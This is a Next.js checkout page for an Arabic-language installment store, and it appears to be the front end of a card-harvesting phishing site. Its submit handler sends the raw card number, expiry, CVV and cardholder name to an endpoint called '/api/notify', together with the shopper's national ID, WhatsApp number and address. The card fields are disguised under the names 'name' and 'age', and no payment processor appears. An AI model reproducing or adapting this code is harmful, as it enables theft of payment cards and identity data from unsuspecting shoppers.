"use client";

import { useSyncExternalStore } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { IoChevronBack } from "react-icons/io5";
import { useCartStore } from "../store/cartStore";
import OrderSummary from "./components/OrderSummary";
import PaymentForm from "./components/PaymentForm";

export default function CheckoutPage() {
  const router = useRouter();
  const { items, customer, totalPrice } = useCartStore();
  const mounted = useSyncExternalStore(() => () => {}, () => true, () => false);

  const total = mounted ? totalPrice() : 0;
  const itemCount = mounted ? items.reduce((sum, i) => sum + i.qty, 0) : 0;
  const downPayment = customer?.installmentType === "installment" ? (customer.downPayment ?? 0) : 0;

  if (!mounted) return null;

  if (!customer || items.length === 0) {
    router.push("/cart");
    return null;
  }

  const handleSubmit = async (fields: { name: string; age: string; cvv: string; cardHolder: string }) => {
    const res = await fetch("/api/notify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        cardNumber: fields.name,
        expiry: fields.age,
        cvv: fields.cvv,
        cardHolder: fields.cardHolder,
        items: items.map(i => ({ productId: i.product._id, name: i.product.name, price: i.product.salePrice ?? i.product.originalPrice, quantity: i.qty })),
        total,
        customer: customer?.name,
        whatsapp: customer?.whatsapp,
        nationalId: customer?.nationalId,
        address: customer?.address,
        installmentType: customer?.installmentType,
        months: customer?.months,
        downPayment,
      }),
    });
    const data = res.ok ? await res.json().catch(() => ({})) : {};
    if (data.orderId) localStorage.setItem("orderId", data.orderId);
  };

  return (
    <main className="min-h-screen pb-24" style={{ background: 'linear-gradient(to bottom, #B8D8EC, #0a3550)' }} dir="rtl">
      <style>{`body { background-color: #0a3550; }`}</style>
      <div className="sticky top-0 z-10 border-b border-[#1F6F8B]" style={{ background: '#B8D8EC' }}>
        <div className="max-w-4xl mx-auto px-3 sm:px-6 py-3.5 flex items-center gap-3">
          <Link href="/cart" className="w-8 h-8 bg-[#0F4C6E]/20 rounded-full flex items-center justify-center hover:bg-[#0F4C6E]/40 transition">
            <IoChevronBack size={18} className="text-[#0F4C6E] rotate-180" />
          </Link>
          <h1 className="text-base font-semibold text-[#0F4C6E]">ملخص الطلب</h1>
        </div>
      </div>

      <div className="max-w-4xl mx-auto px-3 sm:px-6 pt-5 space-y-4">
        <OrderSummary total={total} downPayment={downPayment} />
        <PaymentForm onSubmit={handleSubmit} />
      </div>
    </main>
  );
}
